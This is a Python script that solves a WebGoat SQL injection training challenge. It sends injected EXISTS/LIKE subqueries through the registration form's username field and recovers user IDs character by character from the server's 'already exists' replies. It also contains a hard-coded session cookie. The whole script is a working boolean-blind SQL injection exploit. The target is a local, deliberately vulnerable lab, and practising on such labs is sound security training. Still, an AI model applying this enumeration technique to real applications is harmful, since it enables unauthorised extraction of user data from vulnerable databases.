import json
import requests

#character set for finding user ids
CHARACTER_SET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'

#base url endpoint
BASE_URL = 'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge'

#request headers
HEADERS = {
    'Cookie': "stwGcaftyQKVEJJ0zFtNGJXVBHNWGCfPLJnWcWBG", 
}

#funtion to send request to check if user ID exists.
def send_request(current_user_id):
    """Send request to check if user ID exists."""
    payload = f"tom' AND EXISTS (SELECT 1 FROM CHALLENGE_USERS WHERE userid LIKE '{current_user_id}%');--"
    request_data = {
        'username_reg': payload,
        'email_reg': 'test@example.com',
        'password_reg': 'password',
        'confirm_password_reg': 'password'
    }
    return requests.put(BASE_URL, headers=HEADERS, data=request_data)


#Function to find user IDs starting with the specified prefix.
def find_user_ids_with_prefix(start_prefix):
    """Find user IDs starting with the specified prefix."""
    current_user_id = start_prefix
    discovered_user_ids = []

    while True:
        char_found = False

        for character in CHARACTER_SET:
            response = send_request(current_user_id + character)

            try:
                response_json = response.json()  
            except json.JSONDecodeError:
                print("Error: Unable to parse response. Check your session details.")
                return []

            #Check if the user ID exists
            if "already exists please try to register with a different username" in response_json.get('feedback', ''):
                current_user_id += character
                char_found = True
                break

        if not char_found:
            if current_user_id != start_prefix:
                discovered_user_ids.append(current_user_id)
                print(f"Discovered user ID: {current_user_id}")
            break

    return discovered_user_ids

#Main function to find all user ids
def find_all_user_ids():
    """Find user IDs starting with all possible prefixes."""
    all_user_ids = []
    for prefix in CHARACTER_SET:
        user_ids = find_user_ids_with_prefix(prefix)
        all_user_ids.extend(user_ids)

    #Print all discovered columns
    print("\nAll discovered user IDs:")
    for user_id in all_user_ids:
        print(user_id)

#find all user ids function call
find_all_user_ids()